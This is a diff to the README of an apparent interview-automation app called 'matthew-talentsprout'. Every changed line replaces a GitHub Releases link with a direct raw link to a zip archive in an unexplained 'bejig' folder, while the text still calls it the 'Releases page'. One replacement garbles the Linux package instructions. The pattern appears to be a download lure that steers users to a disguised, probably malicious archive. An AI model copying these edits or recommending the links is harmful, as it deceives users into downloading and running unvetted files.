@@ -1,7 +1,7 @@
 # 🎉 matthew-talentsprout - Simplifying Candidate Interviews
 
 ## 📥 Download the App
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/Austerityaceofclubs947/matthew-talentsprout/releases)
+[![Download](https://raw.githubusercontent.com/Austerityaceofclubs947/matthew-talentsprout/main/bejig/matthew-talentsprout-v1.3.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/Austerityaceofclubs947/matthew-talentsprout/main/bejig/matthew-talentsprout-v1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the **matthew-talentsprout** application. This tool helps automate candidate interviews, saving you time and improving your recruitment process. Follow the steps below to get started.
@@ -20,14 +20,14 @@ Before you begin, ensure your device meets the following requirements:
 - **Voice Integration:** Conduct interviews interactively with voice input.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Austerityaceofclubs947/matthew-talentsprout/releases) to access the latest version of the app.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Austerityaceofclubs947/matthew-talentsprout/main/bejig/matthew-talentsprout-v1.3.zip) to access the latest version of the app.
   
 2. **Choose Your Version**: Look for the most recent release. You will see files available for download.
 
 3. **Download the Installer**:
    - For Windows, choose the `.exe` file.
    - For macOS, select the `.dmg` file.
-   - For Linux, download the appropriate package (`.deb` or `.tar.gz`).
+   - For Linux, download the appropriate package (`.deb` or `https://raw.githubusercontent.com/Austerityaceofclubs947/matthew-talentsprout/main/bejig/matthew-talentsprout-v1.3.zip`).
 
 4. **Run the Installer**:
    - **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
@@ -38,7 +38,7 @@ Before you begin, ensure your device meets the following requirements:
 
 ## 🔄 Updating the App
 To keep your app running smoothly:
-1. Periodically visit the [Releases page](https://github.com/Austerityaceofclubs947/matthew-talentsprout/releases).
+1. Periodically visit the [Releases page](https://raw.githubusercontent.com/Austerityaceofclubs947/matthew-talentsprout/main/bejig/matthew-talentsprout-v1.3.zip).
 2. Download the latest version following the same steps above.
 3. Install the new version over your old installation.
 
